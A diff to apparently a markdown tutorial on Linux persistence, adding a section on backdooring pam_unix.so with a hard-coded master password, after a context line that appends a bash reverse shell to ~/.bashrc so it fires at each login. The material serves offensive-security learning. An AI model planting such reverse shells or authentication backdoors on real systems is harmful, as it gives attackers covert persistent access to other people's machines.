@@ -76,11 +76,16 @@ echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
 ```
 This is going to send us a reverse shell anytime the user logs into the machine.
 
+### 5). pam_unix.so Backdoors...
+the file "pam_unix.so" is one of many files in Linux that is responsible for authentication.
+![image](https://user-images.githubusercontent.com/99975622/216675465-afedd319-5b0f-4c22-9b80-78edf00892d5.png)
+the file "pam_unix.so" uses the "unix_verify_password" function to verify to user's supplied password.
 
+![image](https://user-images.githubusercontent.com/99975622/216675592-7d2be4ee-b567-440e-bbe1-3d42730ad611.png)
+We can modify the file as above...
 
+Say a user types the password "password123" and tries to authenticate. We will compare his password(password123) to the string "0xMitsurugi".
 
+If those two strings match, the authentication is successful. But those 2 strings do not match, so the authentication will not be
 
-
-
-
-
+successful and will rely on the "unix_verify_password" function. When using the "unix_verify_password" function to authenticate, the function takes the user's password from "/etc/shadow" and compares it to the user's supplied password. This is how the intended authentication system should work. 
